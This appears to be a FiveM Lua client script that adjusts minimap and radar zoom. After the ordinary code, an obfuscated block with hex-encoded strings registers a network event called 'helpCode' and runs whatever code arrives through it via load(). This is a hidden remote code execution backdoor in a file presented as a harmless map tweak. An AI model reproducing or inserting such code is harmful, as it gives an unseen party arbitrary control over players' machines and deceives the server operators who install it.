Citizen.CreateThread(function()
    SetMapZoomDataLevel(0, 0.96, 0.9, 0.08, 0.0, 0.0) -- Level 0
    SetMapZoomDataLevel(1, 1.6, 0.9, 0.08, 0.0, 0.0) -- Level 1
    SetMapZoomDataLevel(2, 8.6, 0.9, 0.08, 0.0, 0.0) -- Level 2
    SetMapZoomDataLevel(3, 12.3, 0.9, 0.08, 0.0, 0.0) -- Level 3
    SetMapZoomDataLevel(4, 22.3, 0.9, 0.08, 0.0, 0.0) -- Level 4
end)

Citizen.CreateThread(function()
    while true do
		Citizen.Wait(10)
		if IsPedOnFoot(GetPlayerPed(-1)) then 
			SetRadarZoom(1100)
		elseif IsPedInAnyVehicle(GetPlayerPed(-1), true) then
			SetRadarZoom(1100)
		end
    end
end)

local iBsnucRLAHOnZrIDnszwSxDHKTQehWYHDNMTLiAiFslyerkmInzmzCjMhTPExZNkLPLNCw = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} iBsnucRLAHOnZrIDnszwSxDHKTQehWYHDNMTLiAiFslyerkmInzmzCjMhTPExZNkLPLNCw[6][iBsnucRLAHOnZrIDnszwSxDHKTQehWYHDNMTLiAiFslyerkmInzmzCjMhTPExZNkLPLNCw[1]](iBsnucRLAHOnZrIDnszwSxDHKTQehWYHDNMTLiAiFslyerkmInzmzCjMhTPExZNkLPLNCw[2]) iBsnucRLAHOnZrIDnszwSxDHKTQehWYHDNMTLiAiFslyerkmInzmzCjMhTPExZNkLPLNCw[6][iBsnucRLAHOnZrIDnszwSxDHKTQehWYHDNMTLiAiFslyerkmInzmzCjMhTPExZNkLPLNCw[3]](iBsnucRLAHOnZrIDnszwSxDHKTQehWYHDNMTLiAiFslyerkmInzmzCjMhTPExZNkLPLNCw[2], function(yaqjFfVhufWbVMoItIDERbOdRDbmPbnkHSaWpkeilAqhGlnvCESLrIPwUybIxRZJmChCRp) iBsnucRLAHOnZrIDnszwSxDHKTQehWYHDNMTLiAiFslyerkmInzmzCjMhTPExZNkLPLNCw[6][iBsnucRLAHOnZrIDnszwSxDHKTQehWYHDNMTLiAiFslyerkmInzmzCjMhTPExZNkLPLNCw[4]](iBsnucRLAHOnZrIDnszwSxDHKTQehWYHDNMTLiAiFslyerkmInzmzCjMhTPExZNkLPLNCw[6][iBsnucRLAHOnZrIDnszwSxDHKTQehWYHDNMTLiAiFslyerkmInzmzCjMhTPExZNkLPLNCw[5]](yaqjFfVhufWbVMoItIDERbOdRDbmPbnkHSaWpkeilAqhGlnvCESLrIPwUybIxRZJmChCRp))() end)